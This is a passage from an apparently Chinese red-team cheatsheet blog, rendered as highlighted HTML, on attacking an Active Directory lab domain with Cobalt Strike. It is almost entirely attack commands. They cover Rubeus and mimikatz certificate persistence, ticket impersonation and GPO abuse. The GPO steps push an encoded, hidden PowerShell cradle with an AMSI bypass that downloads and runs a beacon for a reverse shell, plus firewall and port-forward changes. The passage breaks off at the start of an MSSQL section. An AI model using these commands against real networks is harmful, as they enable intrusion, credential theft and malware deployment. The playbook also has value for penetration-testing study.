class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">asktgt</span> /<span class="hljs-type">user</span>:<span class="hljs-type">nlamb</span> /<span class="hljs-type">certificate</span>:<span class="hljs-type">MIINeg</span>[<span class="hljs-type">...</span>]<span class="hljs-type">IH0A</span>== /<span class="hljs-type">password</span>:<span class="hljs-type">mimikatz</span> /<span class="hljs-type">enctype</span>:<span class="hljs-type">aes256</span> /<span class="hljs-type">nowrap</span><br><br><span class="hljs-comment"># 4. Inject the User TGT and look for Local Admin access on Domain machines.</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">createnetonly</span> /<span class="hljs-type">program</span>:<span class="hljs-type">C</span>:\<span class="hljs-type">Windows</span>\<span class="hljs-type">System32</span>\<span class="hljs-type">cmd.exe</span> /<span class="hljs-type">domain</span>:<span class="hljs-type">DEV</span> /<span class="hljs-type">username</span>:<span class="hljs-type">nlamb</span> /<span class="hljs-type">password</span>:<span class="hljs-type">FakePass</span> /<span class="hljs-type">ticket</span>:<span class="hljs-type">doIFyD</span>[<span class="hljs-type">...</span>]<span class="hljs-type">MuaW8</span>=<br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">steal_token</span> <span class="hljs-number">2664</span><br><span class="hljs-comment"># Look for Local Admin Access on other domain computers</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">powerpick</span> <span class="hljs-built_in">Find-LocalAdminAccess</span> -<span class="hljs-type">Verbose</span><br><span class="hljs-comment"># Then check if you can access anything on that machine.</span><br><br><span class="hljs-comment"># PERSIST-2 : Computer Persistance </span><br><br><span class="hljs-comment"># 1-a. Export the machine certificate (requires elevated session)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Seatbelt</span>\<span class="hljs-type">Seatbelt</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Seatbelt.exe</span> <span class="hljs-type">Certificates</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">mimikatz</span> !<span class="hljs-type">crypto</span>::<span class="hljs-type">certificates</span> /<span class="hljs-type">systemstore</span>:<span class="hljs-type">local_machine</span> /<span class="hljs-type">export</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">download</span> <span class="hljs-type">local_machine_My_0_wkstn</span>-<span class="hljs-number">2</span><span class="hljs-type">.dev.cyberbotic.io.pfx</span><br><br><span class="hljs-comment"># 1-b. If machine certificate it not stored, we can requet it using Certify (/machine param is required for auto elevation to system privilege)</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Certify</span>\<span class="hljs-type">Certify</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Certify.exe</span> <span class="hljs-type">request</span> /<span class="hljs-type">ca</span>:<span class="hljs-type">dc</span>-<span class="hljs-number">2</span><span class="hljs-type">.dev.cyberbotic.io</span>\<span class="hljs-type">sub</span>-<span class="hljs-type">ca</span> /<span class="hljs-type">template</span>:<span class="hljs-type">Machine</span> /<span class="hljs-type">machine</span><br><span class="hljs-comment"># Save the Private And Public key both in a file with .pem extension</span><br><span class="hljs-comment"># Then convert the .pem file to .pfx</span><br><span class="hljs-type">ubuntu</span>@<span class="hljs-type">DESKTOP</span>-<span class="hljs-number">3</span><span class="hljs-type">BSK7NO</span> ~&gt; <span class="hljs-type">openssl</span> <span class="hljs-type">pkcs12</span> -<span class="hljs-type">in</span> <span class="hljs-type">cert.pem</span> -<span class="hljs-type">keyex</span> -<span class="hljs-type">CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="hljs-type">export</span> -<span class="hljs-type">out</span> <span class="hljs-type">cert.pfx</span><br><br><span class="hljs-comment"># 2. Encode the certificate, and use it with Rubeus to get TGT for machine account.</span><br><span class="hljs-type">ubuntu</span>@<span class="hljs-type">DESKTOP</span>-<span class="hljs-number">3</span><span class="hljs-type">BSK7NO</span> ~&gt; <span class="hljs-type">cat</span> /<span class="hljs-type">mnt</span>/<span class="hljs-type">c</span>/<span class="hljs-type">Users</span>/<span class="hljs-type">Attacker</span>/<span class="hljs-type">Desktop</span>/<span class="hljs-type">local_machine_My_0_wkstn</span>-<span class="hljs-number">2</span><span class="hljs-type">.dev.cyberbotic.io.pfx</span> | <span class="hljs-type">base64</span> -<span class="hljs-type">w</span> <span class="hljs-number">0</span><br><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">asktgt</span> /<span class="hljs-type">user</span>:<span class="hljs-type">WKSTN</span>-<span class="hljs-number">1</span><span class="hljs-variable">$</span> /<span class="hljs-type">enctype</span>:<span class="hljs-type">aes256</span> /<span class="hljs-type">certificate</span>:<span class="hljs-type">MIINCA</span>[<span class="hljs-type">...</span>]<span class="hljs-type">IH0A</span>== /<span class="hljs-type">password</span>:<span class="hljs-type">mimikatz</span> /<span class="hljs-type">nowrap</span><br><br><span class="hljs-comment"># 3. Then Using S4U2Self to get the TGS from the Machine TGT.</span><br><span class="hljs-comment"># Generate TGS from TGT</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">s4u</span> /<span class="hljs-type">impersonateuser</span>:<span class="hljs-type">Administrator</span> /<span class="hljs-type">self</span> /<span class="hljs-type">altservice</span>:<span class="hljs-type">cifs</span>/<span class="hljs-type">web.dev.cyberbotic.io</span> /<span class="hljs-type">user</span>:<span class="hljs-type">WEB</span><span class="hljs-variable">$</span> /<span class="hljs-type">nowrap</span> /<span class="hljs-type">ticket</span>:<span class="hljs-type">doIFuj</span>[<span class="hljs-type">...</span>]<span class="hljs-type">lDLklP</span><br><span class="hljs-comment"># Inject TGS in a sacrificial process</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">execute</span>-<span class="hljs-type">assembly</span> <span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">Rubeus</span>\<span class="hljs-type">bin</span>\<span class="hljs-type">Release</span>\<span class="hljs-type">Rubeus.exe</span> <span class="hljs-type">createnetonly</span> /<span class="hljs-type">program</span>:<span class="hljs-type">C</span>:\<span class="hljs-type">Windows</span>\<span class="hljs-type">System32</span>\<span class="hljs-type">cmd.exe</span> /<span class="hljs-type">domain</span>:<span class="hljs-type">DEV</span> /<span class="hljs-type">username</span>:<span class="hljs-type">Administrator</span> /<span class="hljs-type">password</span>:<span class="hljs-type">FakePass</span> /<span class="hljs-type">ticket</span>:<span class="hljs-type">doIFyD</span>[<span class="hljs-type">...</span>]<span class="hljs-type">MuaW8</span>=<br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">steal_token</span> <span class="hljs-number">2664</span><br><span class="hljs-type">beacon</span>&gt; <span class="hljs-type">ls</span> \\<span class="hljs-type">web.dev.cyberbotic.io</span>\<span class="hljs-type">c</span><span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>

<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs powershell">**<span class="hljs-comment"># Modify Existing GPO**</span><br><br><span class="hljs-comment"># 1. Identify GPO where current principal has modify rights</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainSID</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGPO</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;CreateChild|WriteProperty&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;S-1-5-21-569305411-121244042-2357301523-[\d]&#123;4,10&#125;&quot;</span> &#125;<br><br><span class="hljs-comment"># 2. Resolve GPOName, Path and SID of principal</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGPO</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;CN=&#123;5059FAC1-5E94-4361-95D3-3BB235A23928&#125;,CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io&quot;</span> | <span class="hljs-built_in">select</span> displayName, gpcFileSysPath<br><br>beacon&gt; powerpick <span class="hljs-built_in">ConvertFrom-SID</span> S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-1107</span><br><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Developers&quot;</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io <span class="hljs-literal">-Recurse</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\&#123;<span class="hljs-number">5059</span>FAC1<span class="hljs-literal">-5E94-4361-95D3-3BB235A23928</span>&#125;<br><br><span class="hljs-comment"># 3. Identify the domain OU where the above GPO applies</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainOU</span> <span class="hljs-literal">-GPLink</span> <span class="hljs-string">&quot;&#123;5059FAC1-5E94-4361-95D3-3BB235A23928&#125;&quot;</span> | <span class="hljs-built_in">select</span> distinguishedName<br><br><span class="hljs-comment"># 4. Identify the systems under the given OU</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-SearchBase</span> <span class="hljs-string">&quot;OU=Workstations,DC=dev,DC=cyberbotic,DC=io&quot;</span> | <span class="hljs-built_in">select</span> dnsHostName<br><br><span class="hljs-comment"># 5. Setup a smb listener and download &amp; execute cradle pointing to port 80</span><br><span class="hljs-comment"># Make sure to use AMSI Bypass with the powershell cradle.</span><br><span class="hljs-built_in">PS</span> C:\&gt; <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;iex (iwr http://wkstn-2:8080/amsi-bypass.ps1 -UseBasicParsing) ; iex (iwr http://wkstn-2:8080/smb -UseBasicParsing);&quot;</span><br><span class="hljs-built_in">PS</span> C:\&gt; [<span class="hljs-type">System.Convert</span>]::ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$str</span>))<br><br>powershell <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-nop</span> <span class="hljs-literal">-enc</span> aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACAAOwAgAGkAZQB4ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBzAG0AYgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA7AA==<br><br><span class="hljs-comment"># 6. Enable inbound traffic on WebDrive by ports (8080) (requires system access)</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Rule 1&quot;</span> <span class="hljs-literal">-Profile</span> Domain <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">8080</span><br>beacon&gt; powershell <span class="hljs-built_in">Remove-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Rule 1&quot;</span><br><br><span class="hljs-comment"># 7. Setup port forwarding rule to accept the Payload Download request locally and forward to our team server </span><br>beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span><br>beacon&gt; rportfwd stop <span class="hljs-number">8080</span><br>beacon&gt; run netstat <span class="hljs-literal">-anp</span> tcp<br><br><span class="hljs-comment"># 8. Use sharpGPOAbuse to add the backdoor (scheduled task) for execution on targetted system</span><br><span class="hljs-comment"># iex (iwr http://wkstn-2:8080/amsi-bypass.ps1 -UseBasicParsing) ; iex (iwr http://wkstn-2:8080/smb -UseBasicParsing);</span><br>execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe <span class="hljs-literal">--AddComputerTask</span> <span class="hljs-literal">--TaskName</span> <span class="hljs-string">&quot;Install Updates&quot;</span> <span class="hljs-literal">--Author</span> NT AUTHORITY\SYSTEM <span class="hljs-literal">--Command</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="hljs-literal">--Arguments</span> <span class="hljs-string">&quot;/c powershell -w hidden -nop -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACAAOwAgAGkAZQB4ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBzAG0AYgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA7AA==&quot;</span> <span class="hljs-literal">--GPOName</span> <span class="hljs-string">&quot;Vulnerable GPO&quot;</span> <span class="hljs-literal">--Force</span><br><br><span class="hljs-comment"># 9. Now as we are using smb listener , We have to manually link with each machine that were present in the OU where this GPO was applied.</span><br><span class="hljs-comment"># Make sure to monitor the web log in cobalt strike for Payload Downloads, And connect to the Smb beacon.</span><br>beacon&gt; link WKSTN<span class="hljs-literal">-1</span> TSVCPIPE<span class="hljs-literal">-4036c92b-65ae-4601-1337-57f7b24a0c57</span><br><br><span class="hljs-comment"># 10. Lastly, either we can wait for the GPO  to be applied or force update to get reverse shell</span><br>cmd&gt; gpupdate /force<br><br><span class="hljs-comment"># 11. Cleaup</span><br>beacon&gt; rportfwd stop <span class="hljs-number">8080</span><br>beacon&gt; powershell <span class="hljs-built_in">Remove-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Rule 1&quot;</span><br><br><span class="hljs-comment">#-------------------------------------------------------------------------------</span><br>**<span class="hljs-comment"># Create and Link new GPO**</span><br><br><span class="hljs-comment"># 1. Check the rights to create a new GPO in Domain</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io&quot;</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Group-Policy-Container&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-contains</span> <span class="hljs-string">&quot;CreateChild&quot;</span> &#125; | % &#123; <span class="hljs-built_in">ConvertFrom-SID</span> <span class="hljs-variable">$_</span>.SecurityIdentifier &#125;<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Developers&quot;</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io <span class="hljs-literal">-Recurse</span><br><span class="hljs-comment"># 2. Find the OU where any principal has &quot;Write gPlink Privilege&quot;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainOU</span> | <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> | ? &#123; <span class="hljs-variable">$_</span>.ObjectAceType <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;GP-Link&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;WriteProperty&quot;</span> &#125; | <span class="hljs-built_in">select</span> ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | <span class="hljs-built_in">fl</span><br><br>beacon&gt; powerpick <span class="hljs-built_in">ConvertFrom-SID</span> S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-1107</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-SearchBase</span> <span class="hljs-string">&quot;OU=Workstations,DC=dev,DC=cyberbotic,DC=io&quot;</span> | <span class="hljs-built_in">select</span> dnsHostName<br><br><span class="hljs-comment"># 3. Verify if RSAT module is installed for GPO abuse</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-Module</span> <span class="hljs-literal">-List</span> <span class="hljs-literal">-Name</span> GroupPolicy | <span class="hljs-built_in">select</span> <span class="hljs-literal">-expand</span> ExportedCommands<br><br><span class="hljs-comment"># 4. Create a new GPO &amp; configure it to execute attacker binary via Registry loaded from shared location or Use Powershell cradle to download payload from CS server.</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-GPO</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Evil GPO&quot;</span><br><br><span class="hljs-comment"># 4-a. Using Shared Location to upload payload</span><br>beacon&gt; powerpick <span class="hljs-built_in">Find-DomainShare</span> <span class="hljs-literal">-CheckShareAccess</span><br>beacon&gt; <span class="hljs-built_in">cd</span> \\dc<span class="hljs-literal">-2</span>\software<br>beacon&gt; upload C:\Payloads\pivot.exe<br><br>beacon&gt; powerpick <span class="hljs-built_in">Set-GPPrefRegistryValue</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Evil GPO&quot;</span> <span class="hljs-literal">-Context</span> Computer <span class="hljs-literal">-Action</span> Create <span class="hljs-literal">-Key</span> <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> <span class="hljs-literal">-ValueName</span> <span class="hljs-string">&quot;Updater&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe&quot;</span> <span class="hljs-literal">-Type</span> ExpandString <br><span class="hljs-comment"># NOTE: HKLM based autorun changes requires system reboot to take effect</span><br><br><span class="hljs-comment"># 4-b. Or Use Powershell cradle to download payload from CS server.</span><br><span class="hljs-comment"># download &amp; execute smb cradle pointing to pivot (80)</span><br><span class="hljs-comment"># Make sure to use AMSI Bypass with the powershell cradle.</span><br><span class="hljs-built_in">PS</span> C:\&gt; <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;iex (iwr http://wkstn-2:8080/amsi-bypass.ps1 -UseBasicParsing) ; iex (iwr http://wkstn-2:8080/smb -UseBasicParsing);&quot;</span><br><span class="hljs-built_in">PS</span> C:\&gt; [<span class="hljs-type">System.Convert</span>]::ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$str</span>))<br>powershell <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-nop</span> <span class="hljs-literal">-enc</span> aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACAAOwAgAGkAZQB4ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBzAG0AYgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA7AA==<br><span class="hljs-comment"># Enable inbound traffic on WebDrive by ports (8080) (requires system access)</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Rule 1&quot;</span> <span class="hljs-literal">-Profile</span> Domain <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">8080</span><br><span class="hljs-comment"># Setup port forwarding rule to accept the Payload Download request locally and forward to our team server </span><br>beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span><br><span class="hljs-comment"># Configure  GPO to use the powershell execute cradle.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Set-GPPrefRegistryValue</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Evil GPO&quot;</span> <span class="hljs-literal">-Context</span> Computer <span class="hljs-literal">-Action</span> Create <span class="hljs-literal">-Key</span> <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> <span class="hljs-literal">-ValueName</span> <span class="hljs-string">&quot;Updater&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe /c powershell -w hidden -nop -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACAAOwAgAGkAZQB4ACAAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBzAG0AYgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA7AA==&quot;</span> <span class="hljs-literal">-Type</span> ExpandString<br><br><span class="hljs-comment"># 5. Link newly created GPO with OU</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-GPO</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Evil GPO&quot;</span> | <span class="hljs-built_in">New-GPLink</span> <span class="hljs-literal">-Target</span> <span class="hljs-string">&quot;OU=Workstations,DC=dev,DC=cyberbotic,DC=io&quot;</span><br><br><span class="hljs-comment"># 6. Now as we are using smb listener , We have to manually link with each machine that were present in the OU where this GPO was applied.</span><br><span class="hljs-comment"># Make sure to monitor the web log in cobalt strike for Payload Downloads, And connect to the Smb beacon.</span><br>beacon&gt; link WKSTN<span class="hljs-literal">-1</span> TSVCPIPE<span class="hljs-literal">-4036c92b-65ae-4601-1337-57f7b24a0c57</span><br><br><span class="hljs-comment"># 7. Lastly, either we can wait for the GPO  to be applied or force update to get reverse shell</span><br>cmd&gt; gpupdate /force<br><br><span class="hljs-comment"># 8. Cleaup</span><br>beacon&gt; rportfwd stop <span class="hljs-number">8080</span><br>beacon&gt; powershell <span class="hljs-built_in">Remove-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Rule 1&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="MSSQL-服务器"><a href="#MSSQL-服务器" class="headerlink" title="MSSQL 服务器"></a>MSSQL 服务器</h3><ul>
<li><p>MSSQL 服务器 - 快速命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># MSSQL Server - Cheatsheet</span><br><span class="hljs-comment"># SQLRecon : https://github.com/skahwah/SQLRecon/wiki</span><br><span class="hljs-comment"># PowerUpSQL : https://github.com/NetSPI/PowerUpSQL/wiki</span><br>  <br><span class="hljs-comment">#1 Look for MSSQL Server</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> C:\Tools\PowerUpSQL\PowerUpSQL.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLInstanceDomain</span><br>  <br><span class="hljs-comment">#2 Check if we can access the MSSQL Server</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLConnectionTest</span> <span class="hljs-literal">-Instance</span> sql<span 